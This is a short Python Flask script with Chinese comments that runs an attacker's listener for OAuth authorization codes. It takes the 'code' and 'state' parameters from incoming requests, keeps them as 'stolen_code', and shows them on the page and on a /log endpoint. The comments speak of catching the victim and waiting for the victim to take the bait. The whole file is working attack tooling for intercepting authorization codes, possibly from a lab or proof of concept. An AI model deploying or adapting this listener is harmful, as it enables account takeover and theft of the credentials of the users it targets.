from flask import Flask, request

app = Flask(__name__)

# 用来存储抓到的 code
stolen_code = ""

@app.route('/')
def home():
    global stolen_code
    # 获取 URL 中的 code 参数
    code = request.args.get('code')
    state = request.args.get('state')

    if code:
        stolen_code = code
        # 如果有人带着 code 来了，就在页面上显示出来
        return f"<h1>抓到你了！</h1><p>Code is: <b>{code}</b></p><p>State is: {state}</p>"
    else:
        # 如果没人来，就显示等待
        return "等待受害者上钩... (当前没有捕获到Code)"

@app.route('/log')
def log():
    # 这是一个备用接口，方便你看日志
    return f"Last captured code: {stolen_code}"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
